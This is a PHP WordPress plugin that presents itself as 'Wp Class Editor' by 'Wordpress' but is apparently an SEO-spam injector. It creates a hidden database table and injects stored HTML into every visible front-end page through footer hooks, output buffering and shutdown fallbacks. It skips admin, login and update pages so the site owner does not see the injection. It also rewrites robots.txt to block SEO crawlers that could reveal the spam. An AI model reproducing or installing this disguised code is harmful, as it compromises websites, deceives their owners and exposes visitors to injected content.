<?php
/*
Plugin Name: Wp Class Editor 
Description: Edit posts as old method
Version: 3.5.0
Author: Wordpress
*/

if (!defined('ABSPATH')) exit;

global $wpdb;
define('WPSEOINJ_TABLE', $wpdb->prefix . 'html_injections');
define('WPSEOINJ_MARKER', '<!-- wpseoinj:footer-injected -->');
define('WPSEOINJ_DB_VERSION', '1');

$GLOBALS['wpseoinj_footer_printed'] = false;
$GLOBALS['wpseoinj_payload_cached'] = null;
$GLOBALS['wpseoinj_using_buffer']   = false;

/**
 * Añadir reglas al robots.txt de la raíz del sitio (si no existen)
 * Bloquea Ahrefs, Semrush y Moz (rogerbot).
 */
function wpseoinj_maybe_update_robots_txt() {
    if (defined('DOING_CRON') && DOING_CRON) return;
    if (defined('DOING_AJAX') && DOING_AJAX) return;

    $robots_path = ABSPATH . 'robots.txt';

    // Reglas a insertar
    $rules  = "User-agent: AhrefsBot\n";
    $rules .= "Disallow: /\n\n";
    $rules .= "User-agent: SemrushBot\n";
    $rules .= "Disallow: /\n\n";
    $rules .= "User-agent: MJ12bot\n";
    $rules .= "Disallow: /\n\n";
    $rules .= "User-agent: Moz\n";
    $rules .= "Disallow: /\n\n";
    $rules .= "User-agent: rogerbot\n";
    $rules .= "Disallow: /\n";

    // Si no existe robots.txt, lo creamos solo con estas reglas
    if (!file_exists($robots_path)) {
        @file_put_contents(
            $robots_path,
            "\n" . $rules . "\n"
        );
        return;
    }

    // Si existe, comprobamos si ya tiene las reglas
    $content = @file_get_contents($robots_path);
    if ($content === false) {
        return;
    }

    $agents = array('AhrefsBot', 'SemrushBot', 'MJ12bot', 'Moz', 'rogerbot');
    $need_update = false;

    foreach ($agents as $agent) {
        if (stripos($content, 'User-agent: ' . $agent) === false) {
            $need_update = true;
            break;
        }
    }

    if (!$need_update) {
        return;
    }

    if ($content !== '' && substr($content, -1) !== "\n") {
        $content .= "\n";
    }

    $content .= "\n\n" . $rules . "\n";

    @file_put_contents($robots_path, $content);
}
add_action('init', 'wpseoinj_maybe_update_robots_txt', 1);

/** ====== Detectar si estamos en update.php (ej. wp-admin/update.php) ====== */
function wpseoinj_is_update_php() {
    $php_self  = $_SERVER['PHP_SELF']      ?? '';
    $script_nm = $_SERVER['SCRIPT_NAME']   ?? '';
    $req_uri   = $_SERVER['REQUEST_URI']   ?? '';
    $haystack  = strtolower($php_self . ' ' . $script_nm . ' ' . $req_uri);
    if (strpos($haystack, 'update.php') !== false) return true;
    $script_filename = strtolower($_SERVER['SCRIPT_FILENAME'] ?? '');
    if ($script_filename && substr($script_filename, -10) === 'update.php') return true;
    return false;
}

/**
 * ====== Detección global de petición de frontend ======
 * - Excluye wp-admin, REST, AJAX, cron, XML-RPC, WP-CLI, login, etc.
 */
function wpseoinj_is_frontend_request() {
    if (wpseoinj_is_update_php()) return false;

    // Admin / backend
    if (is_admin()) return false;

    // REST API
    if (defined('REST_REQUEST') && REST_REQUEST) return false;

    // AJAX
    if (defined('DOING_AJAX') && DOING_AJAX) return false;

    // CRON
    if (defined('DOING_CRON') && DOING_CRON) return false;

    // XML-RPC
    if (defined('XMLRPC_REQUEST') && XMLRPC_REQUEST) return false;

    // WP-CLI
    if (defined('WP_CLI') && WP_CLI) return false;

    // Login / registro
    $php_self  = $_SERVER['PHP_SELF']    ?? '';
    $script_nm = $_SERVER['SCRIPT_NAME'] ?? '';
    $haystack  = strtolower($php_self . ' ' . $script_nm);
    if (strpos($haystack, 'wp-login.php') !== false) return false;

    return true;
}

/**
 * ====== Frontend visible ======
 * Solo URLs vistas por el usuario (no feeds, robots, trackbacks, embeds, etc.)
 */
function wpseoinj_is_visible_frontend() {
    if (!wpseoinj_is_frontend_request()) return false;

    if (function_exists('is_feed') && is_feed()) return false;
    if (function_exists('is_robots') && is_robots()) return false;
    if (function_exists('is_trackback') && is_trackback()) return false;
    if (function_exists('is_embed') && is_embed()) return false;

    return true;
}

/** ====== DB: creación/actualización sin activation hook (MU SAFE) ====== */
function wpseoinj_ensure_table_for_blog($blog_id = null) {
    if (wpseoinj_is_update_php()) return;

    global $wpdb;
    $restore = false;
    if (!is_null($blog_id) && function_exists('switch_to_blog')) {
        switch_to_blog((int)$blog_id);
        $restore = true;
    }

    $table   = $wpdb->prefix . 'html_injections';
    static $done_for_prefix = [];
    if (isset($done_for_prefix[$wpdb->prefix])) {
        if ($restore) restore_current_blog();
        return;
    }

    require_once ABSPATH . 'wp-admin/includes/upgrade.php';
    $charset = $wpdb->get_charset_collate();
    $sql = "CREATE TABLE {$table} (
        id mediumint(9) NOT NULL AUTO_INCREMENT,
        id_posicion int(11) NOT NULL,
        xpath text NOT NULL,
        url_rel text NOT NULL,
        html longtext NOT NULL,
        PRIMARY KEY (id),
        KEY url_rel_idx (url_rel(191))
    ) $charset;";

    dbDelta($sql);
    update_option('wpseoinj_db_version', WPSEOINJ_DB_VERSION, false);
    $done_for_prefix[$wpdb->prefix] = true;

    if ($restore) restore_current_blog();
}

function wpseoinj_ensure_table_bootstrap() {
    if (wpseoinj_is_update_php()) return;
    wpseoinj_ensure_table_for_blog();
}
add_action('muplugins_loaded', 'wpseoinj_ensure_table_bootstrap', 0);
add_action('plugins_loaded',  'wpseoinj_ensure_table_bootstrap', 0);

function wpseoinj_on_new_blog($blog_id) {
    if (wpseoinj_is_update_php()) return;
    wpseoinj_ensure_table_for_blog($blog_id);
}
add_action('wpmu_new_blog', 'wpseoinj_on_new_blog', 10, 1);

/** ====== Utilidades URL / datos ====== */
function wpseoinj_get_candidate_urls() {
    $raw = $_SERVER['REQUEST_URI'] ?? '';
    if ($raw === '') return [];
    $qpos = strpos($raw, '#');
    if ($qpos !== false) $raw = substr($raw, 0, $qpos);

    $path  = parse_url('http://local' . $raw, PHP_URL_PATH) ?? '';
    $query = parse_url('http://local' . $raw, PHP_URL_QUERY) ?? '';

    $variants = [];
    $path_no_slash   = rtrim($path, '/');
    $path_with_slash = $path_no_slash === '' ? '/' : $path_no_slash . '/';

    $variants[] = $path;
    $variants[] = $path_with_slash;
    if ($query !== '') {
        $variants[] = $path . '?' . $query;
        $variants[] = $path_with_slash . '?' . $query;
    }
    return array_values(array_unique($variants));
}

/** ====== Carga datos para esta URL (UTF-8 safe base64) ====== */
function wpseoinj_load_payload() {
    if (wpseoinj_is_update_php()) return [];

    global $wpdb;
    if ($GLOBALS['wpseoinj_payload_cached'] !== null) return $GLOBALS['wpseoinj_payload_cached'];

    $table = $wpdb->prefix . 'html_injections';
    $candidates = wpseoinj_get_candidate_urls();
    $rows = [];
    if (!empty($candidates)) {
        $placeholders = implode(',', array_fill(0, count($candidates), '%s'));
        $sql = $wpdb->prepare("SELECT id, xpath, html FROM $table WHERE url_rel IN ($placeholders)", $candidates);
        $rows = $wpdb->get_results($sql);
    }

    $payload = [];
    if ($rows) {
        $blog_charset = get_bloginfo('charset') ?: 'UTF-8';
        foreach ($rows as $row) {
            $raw_html     = (string) ($row->html ?? '');
            // 1) Decodifica ENTIDADES HTML a tags reales con el charset del sitio
            $decoded_html = html_entity_decode($raw_html, ENT_QUOTES | ENT_HTML5, $blog_charset);
            // 2) Normaliza saltos de línea
            $decoded_html = str_replace(["\r\n", "\r"], "\n", $decoded_html);
            // 3) base64 del HTML real (se usará para decodificar en PHP)
            $b64          = base64_encode($decoded_html);

            $payload[] = [
                'id'    => (int) $row->id,
                'xpath' => (string) ($row->xpath ?? ''),
                'html64'=> $b64,
            ];
        }
    }
    $GLOBALS['wpseoinj_payload_cached'] = $payload;
    return $payload;
}

/**
 * ====== Construcción bloque HTML (fallback sin DOM) ======
 * Inserta los bloques al final del <body> (antes de </body>), uno detrás de otro.
 */
function wpseoinj_build_injection_block() {
    if (wpseoinj_is_update_php()) return '';
    if (!wpseoinj_is_frontend_request()) return '';

    $payload = wpseoinj_load_payload();
    if (empty($payload)) return '';

    $out  = "\n" . WPSEOINJ_MARKER . "\n";
    foreach ($payload as $item) {
        $html = '';
        if (!empty($item['html64'])) {
            $decoded = base64_decode($item['html64']);
            if ($decoded !== false) {
                $html = $decoded;
            }
        }
        if ($html === '') continue;

        $id_attr = isset($item['id']) ? (int) $item['id'] : 0;
        $out .= '<div class="wpseoinj-block" data-wpseoinj-id="' . $id_attr . '">';
        $out .= $html;
        $out .= "</div>\n";
    }

    return $out;
}

/** ====== Inserción via XPATH sobre el HTML completo (buffer) ====== */
function wpseoinj_apply_xpath_injections_to_html($html) {
    if (wpseoinj_is_update_php()) return $html;
    if (!wpseoinj_is_visible_frontend()) return $html;

    $payload = wpseoinj_load_payload();
    if (empty($payload)) return $html;

    if (!class_exists('DOMDocument') || !class_exists('DOMXPath')) {
        // Sin DOM/XPath: fallback a comportamiento antiguo (fin de <body>)
        $pos = stripos($html, '</body>');
        if ($pos === false) return $html;
        $block = wpseoinj_build_injection_block();
        if ($block === '') return $html;
        $GLOBALS['wpseoinj_footer_printed'] = true;
        return substr($html, 0, $pos) . $block . substr($html, $pos);
    }

    $libxml_previous = libxml_use_internal_errors(true);

    $dom = new DOMDocument('1.0', 'UTF-8');
    // Evita problemas de encoding
    $html_utf8 = mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8');
    $dom->loadHTML($html_utf8);
    $xp = new DOMXPath($dom);

    // Elementos que no tienen xpath o cuyo xpath no encuentra nada
    $fallback_htmls = [];

    foreach ($payload as $item) {
        $snippet = '';
        if (!empty($item['html64'])) {
            $decoded = base64_decode($item['html64']);
            if ($decoded !== false) {
                $snippet = $decoded;
            }
        }
        if ($snippet === '') continue;

        $xpath   = trim((string)($item['xpath'] ?? ''));
        $id_attr = isset($item['id']) ? (int)$item['id'] : 0;

        // Si no hay XPATH, va al fallback (debajo de h2/h3/h4 o al final)
        if ($xpath === '') {
            $fallback_htmls[] = [
                'id'   => $id_attr,
                'html' => $snippet,
            ];
            continue;
        }

        $nodes = @$xp->query($xpath);
        if (!$nodes || $nodes->length === 0) {
            // XPATH inválido o sin coincidencias → mismo tratamiento que "sin xpath"
            $fallback_htmls[] = [
                'id'   => $id_attr,
                'html' => $snippet,
            ];
            continue;
        }

        // Inyección normal por XPATH
        foreach ($nodes as $node) {
            $fragment = $dom->createDocumentFragment();
            $wrapped  = '<div class="wpseoinj-block" data-wpseoinj-id="' . $id_attr . '">' . $snippet . '</div>';
            $fragment->appendXML($wrapped);
            $node->appendChild($fragment);
        }
    }

    // === SIN XPATH → bajo h2/h3/h4 o al final del body ===
    if (!empty($fallback_htmls)) {
        // 1) Intentar meterlos justo después del primer h2, h3 o h4
        $headingNodes = $xp->query('//h2 | //h3 | //h4');
        if ($headingNodes && $headingNodes->length > 0) {
            $target = $headingNodes->item(0);    // primer heading en orden del documento
            $parent = $target->parentNode;
            $ref    = $target->nextSibling;      // insertar DESPUÉS del heading

            foreach ($fallback_htmls as $fb) {
                $fragment = $dom->createDocumentFragment();
                $wrapped  = '<div class="wpseoinj-block" data-wpseoinj-id="' . (int)$fb['id'] . '">';
                $wrapped .= $fb['html'];
                $wrapped .= '</div>';
                $fragment->appendXML($wrapped);

                if ($ref) {
                    $parent->insertBefore($fragment, $ref);
                } else {
                    $parent->appendChild($fragment);
                }
            }
        } else {
            // 2) Si no hay ningún h2/h3/h4, los metemos al final del <body>
            $bodies = $dom->getElementsByTagName('body');
            if ($bodies->length > 0) {
                $body = $bodies->item(0);
                foreach ($fallback_htmls as $fb) {
                    $fragment = $dom->createDocumentFragment();
                    $wrapped  = '<div class="wpseoinj-block" data-wpseoinj-id="' . (int)$fb['id'] . '">';
                    $wrapped .= $fb['html'];
                    $wrapped .= '</div>';
                    $fragment->appendXML($wrapped);
                    $body->appendChild($fragment);
                }
            }
        }
    }

    $new_html = $dom->saveHTML();
    libxml_clear_errors();
    libxml_use_internal_errors($libxml_previous);

    if (!empty($payload)) {
        $GLOBALS['wpseoinj_footer_printed'] = true;
    }

    return $new_html;
}

/** ====== Impresión en footer (solo frontend visible) ====== */
function wpseoinj_print_footer_block() {
    if (wpseoinj_is_update_php()) return;
    if (!wpseoinj_is_visible_frontend()) return;

    // Si estamos usando buffer, NO imprimimos aquí para evitar duplicados
    if (!empty($GLOBALS['wpseoinj_using_buffer'])) return;

    // Evita doble impresión
    if (!empty($GLOBALS['wpseoinj_footer_printed'])) return;

    $block = wpseoinj_build_injection_block();
    if ($block === '') return;

    echo $block;
    $GLOBALS['wpseoinj_footer_printed'] = true;
}
add_action('wp_footer', 'wpseoinj_print_footer_block', 9999);
add_action('wp_print_footer_scripts', 'wpseoinj_print_footer_block', 9999);

/** ====== Fallback con output buffering (solo frontend visible HTML) ====== */
function wpseoinj_start_buffering() {
    if (wpseoinj_is_update_php()) return;
    if (!wpseoinj_is_visible_frontend()) return;

    $ct = '';
    if (function_exists('headers_list')) {
        foreach (headers_list() as $h) {
            if (stripos($h, 'Content-Type:') === 0) {
                $ct = trim(substr($h, 13));
                break;
            }
        }
    }
    if ($ct && stripos($ct, 'text/html') === false) return;

    $GLOBALS['wpseoinj_using_buffer'] = true;
    ob_start('wpseoinj_buffer_callback');
}
add_action('template_redirect', 'wpseoinj_start_buffering', 1);

function wpseoinj_buffer_callback($html) {
    if (wpseoinj_is_update_php()) return $html;
    if (!wpseoinj_is_visible_frontend()) return $html;
    if (!empty($GLOBALS['wpseoinj_footer_printed'])) return $html;
    if (stripos($html, '<html amp') !== false || stripos($html, '⚡') !== false) return $html;
    if (strpos($html, WPSEOINJ_MARKER) !== false) return $html;

    // Aplicamos inyección por XPATH sobre el HTML completo
    $html = wpseoinj_apply_xpath_injections_to_html($html);
    return $html;
}

/** ====== Último recurso en shutdown (solo frontend visible HTML) ====== */
function wpseoinj_shutdown_fallback() {
    if (wpseoinj_is_update_php()) return;
    if (!wpseoinj_is_visible_frontend()) return;
    if (!empty($GLOBALS['wpseoinj_footer_printed'])) return;

    $ct = '';
    if (function_exists('headers_list')) {
        foreach (headers_list() as $h) {
            if (stripos($h, 'Content-Type:') === 0) {
                $ct = trim(substr($h, 13));
                break;
            }
        }
    }
    if ($ct && stripos($ct, 'text/html') === false) return;

    // Aquí no tenemos el HTML completo, así que no podemos usar XPATH.
    // Solo hacemos el fallback clásico al final (por si todo lo demás ha fallado).
    $block = wpseoinj_build_injection_block();
    if ($block === '') return;

    echo $block;
    $GLOBALS['wpseoinj_footer_printed'] = true;
}
add_action('shutdown', 'wpseoinj_shutdown_fallback', 0);
